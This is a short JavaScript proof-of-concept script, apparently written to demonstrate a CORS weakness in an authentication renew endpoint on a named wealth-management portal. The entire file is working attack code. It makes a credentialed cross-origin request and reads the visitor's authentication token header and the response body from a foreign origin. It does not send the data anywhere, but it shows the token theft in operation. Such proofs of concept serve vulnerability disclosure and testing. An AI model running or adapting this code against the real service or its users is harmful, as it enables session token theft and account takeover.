const output = document.getElementById("output");

// Optional: append ?username=<user> to the PoC page URL to mirror the portal's own renew call.
const user = new URLSearchParams(location.search).get("username");
const url = "https://portfolio.stonehagefleming.com/LOSSPI-external/2.0/authn/renew" +
  (user ? "?username=" + encodeURIComponent(user) + "&cliid_appl=g3web_LODH" : "");

// Headers the server lists in Access-Control-Expose-Headers.
const exposed = [
  "Frontgate-Authentication-Token",
  "Frontgate-Authentication-Type",
  "Frontgate-Host",
  "Content-Type",
  "Date"
];

fetch(url, { method: "GET", credentials: "include" })
.then(async response => {
  const body = await response.text();
  const headers = exposed
    .map(h => h + ": " + (response.headers.get(h) ?? "(absent)"))
    .join("\n");

  output.textContent =
    "Origin: " + location.origin +
    "\nRequest: " + url +
    "\nStatus: " + response.status +
    "\n\nExposed headers read cross-origin:\n" + headers +
    "\n\nResponse:\n" + body;
})
.catch(error => {
  output.textContent =
    "Origin: " + location.origin +
    "\n\nRequest failed:\n" + error;
});
